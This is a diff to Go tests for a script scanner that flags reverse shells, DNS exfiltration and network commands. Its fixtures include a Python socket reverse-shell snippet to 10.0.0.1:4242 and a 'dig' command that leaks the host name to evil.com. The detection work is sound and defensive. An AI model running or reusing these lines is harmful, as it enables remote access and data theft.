@@ -22,7 +22,7 @@ func TestNetworkChecker_ReverseShell(t *testing.T) {
 		t.Run(tt.name, func(t *testing.T) {
 			t.Parallel()
 
-			sc := newSingleScriptContext(tt.script)
+			sc := newSingleScriptContext(t, tt.script)
 			checker := NewNetworkChecker()
 			findings, err := checker.Check(t.Context(), sc)
 			if err != nil {
@@ -55,7 +55,7 @@ func TestNetworkChecker_DNSExfiltration(t *testing.T) {
 		t.Run(tt.name, func(t *testing.T) {
 			t.Parallel()
 
-			sc := newSingleScriptContext(tt.script)
+			sc := newSingleScriptContext(t, tt.script)
 			checker := NewNetworkChecker()
 			findings, err := checker.Check(t.Context(), sc)
 			if err != nil {
@@ -79,7 +79,7 @@ func TestNetworkChecker_EncodedURL(t *testing.T) {
 	t.Parallel()
 
 	// "aHR0c" is the base64 prefix of "http"
-	sc := newSingleScriptContext("echo aHR0cHM6Ly9leGFtcGxlLmNvbQ== | base64 -d")
+	sc := newSingleScriptContext(t, "echo aHR0cHM6Ly9leGFtcGxlLmNvbQ== | base64 -d")
 	checker := NewNetworkChecker()
 	findings, err := checker.Check(t.Context(), sc)
 	if err != nil {
@@ -112,7 +112,7 @@ func TestNetworkChecker_NetworkCommand(t *testing.T) {
 		t.Run(tt.name, func(t *testing.T) {
 			t.Parallel()
 
-			sc := newSingleScriptContext(tt.script)
+			sc := newSingleScriptContext(t, tt.script)
 			checker := NewNetworkChecker()
 			findings, err := checker.Check(t.Context(), sc)
 			if err != nil {
@@ -137,7 +137,7 @@ func TestNetworkChecker_ReverseShellMultiline(t *testing.T) {
 
 	// Multi-line Python reverse shell spread across lines within a -c argument.
 	script := "python3 -c '\nimport socket\ns=socket.socket()\ns.connect((\"10.0.0.1\",4242))\n'"
-	sc := newSingleScriptContext(script)
+	sc := newSingleScriptContext(t, script)
 	checker := NewNetworkChecker()
 	findings, err := checker.Check(t.Context(), sc)
 	if err != nil {
@@ -171,7 +171,7 @@ func TestNetworkChecker_ReverseShellVariants(t *testing.T) {
 		t.Run(tt.name, func(t *testing.T) {
 			t.Parallel()
 
-			sc := newSingleScriptContext(tt.script)
+			sc := newSingleScriptContext(t, tt.script)
 			checker := NewNetworkChecker()
 			findings, err := checker.Check(t.Context(), sc)
 			if err != nil {
@@ -194,7 +194,7 @@ func TestNetworkChecker_ReverseShellVariants(t *testing.T) {
 func TestNetworkChecker_DNSExfiltrationBacktick(t *testing.T) {
 	t.Parallel()
 
-	sc := newSingleScriptContext("dig `hostname -f`.evil.com")
+	sc := newSingleScriptContext(t, "dig `hostname -f`.evil.com")
 	checker := NewNetworkChecker()
 	findings, err := checker.Check(t.Context(), sc)
 	if err != nil {
@@ -215,7 +215,7 @@ func TestNetworkChecker_DNSExfiltrationBacktick(t *testing.T) {
 func TestNetworkChecker_Clean(t *testing.T) {
 	t.Parallel()
 
-	sc := newSingleScriptContext("echo hello && ls -la")
+	sc := newSingleScriptContext(t, "echo hello && ls -la")
 	checker := NewNetworkChecker()
 	findings, err := checker.Check(t.Context(), sc)
 	if err != nil {
